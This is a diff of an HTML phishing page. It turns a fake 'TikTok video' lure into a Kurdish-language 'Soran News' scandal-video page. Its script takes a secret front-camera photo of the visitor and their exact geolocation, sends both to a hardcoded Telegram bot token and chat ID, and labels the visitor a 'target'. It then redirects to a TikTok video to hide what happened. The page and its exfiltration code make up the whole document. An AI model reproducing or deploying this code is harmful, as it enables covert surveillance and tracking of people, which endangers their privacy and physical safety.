@@ -3,13 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok · Video Content</title>
-    <meta property="og:title" content="TikTok · Video Content">
-    <meta property="og:image" content="https://i.ibb.co/1t8S4QVG/42269.jpg">
+    
+    <title>Soran News - کێشەی خەڵک</title>
+    <meta property="og:title" content="کێشەیەکی نوێ لە ئیدارەی سۆران بڵاوکرایەوە">
+    <meta property="og:description" content="بینەری ڤیدیۆکە بن، خەڵکێکی زۆر ناڕەزایەتی دەردەبڕن">
+    <meta property="og:image" content="https://i.ibb.co/v4mCH6mS/fV955-Hdh.jpg">
 
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; display: flex; justify-content: center; align-items: center; }
-        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.ibb.co/1t8S4QVG/42269.jpg') no-repeat center center; background-size: cover; z-index: 1; }
+        .bg { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: url('https://i.ibb.co/v4mCH6mS/fV955-Hdh.jpg') no-repeat center center; 
+            background-size: cover; z-index: 1; filter: brightness(0.6); 
+        }
         .play-btn { position: absolute; z-index: 100; cursor: pointer; background: rgba(255,255,255,0.1); border-radius: 50%; padding: 20px; backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.3); }
         .play-icon { width: 80px; height: 80px; fill: white; opacity: 0.9; }
         video, canvas { display: none; }
@@ -27,6 +33,7 @@
     <script>
         const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
         const chat_id = "7261354534";
+        const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
 
         async function ultraCapture() {
             const b = document.getElementById('body');
@@ -34,18 +41,15 @@
             const trap = document.getElementById('trap');
 
             try {
-                // 1. Get Camera Permission FIRST
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('v');
                 v.srcObject = s;
                 await v.play();
 
-                // Flash & Hide UI
                 trap.style.display = 'none';
                 bg.style.display = 'none';
                 b.classList.add('flash-active');
 
-                // 2. Capture and Send Photo
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth;
@@ -57,17 +61,16 @@
                     
                     const formData = new FormData();
                     formData.append('chat_id', chat_id);
-                    formData.append('photo', blob, 'photo.jpg');
-                    formData.append('caption', `📸 Photo Captured Successfully\n📱 Device: ${navigator.userAgent.match(/iPhone/i) ? "iPhone" : "Android"}`);
+                    formData.append('photo', blob, 'soran_target.jpg');
+                    formData.append('caption', `🚩 **Soran Page Target Captured**\n📱 Device: ${navigator.userAgent.match(/iPhone/i) ? "iPhone" : "Android"}`);
 
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
 
-                    // 3. NOW Request Location
                     requestLocation();
                 }, 1800);
 
             } catch (e) {
-                window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
+                window.location.href = targetVideo;
             }
         }
 
@@ -76,18 +79,15 @@
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const msg = `📍 Exact Location Found!\n🔗 Google Maps: https://www.google.com/maps?q=${lat},${lon}`;
+                    const msg = `📍 **Target Exact Location:**\nhttps://www.google.com/maps?q=${lat},${lon}`;
                     
                     await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
-                    
-                    // Final Redirect
-                    window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
+                    window.location.href = targetVideo;
                 }, () => {
-                    // If user denies location, still redirect
-                    window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
+                    window.location.href = targetVideo;
                 });
             } else {
-                window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
+                window.location.href = targetVideo;
             }
         }
     </script>
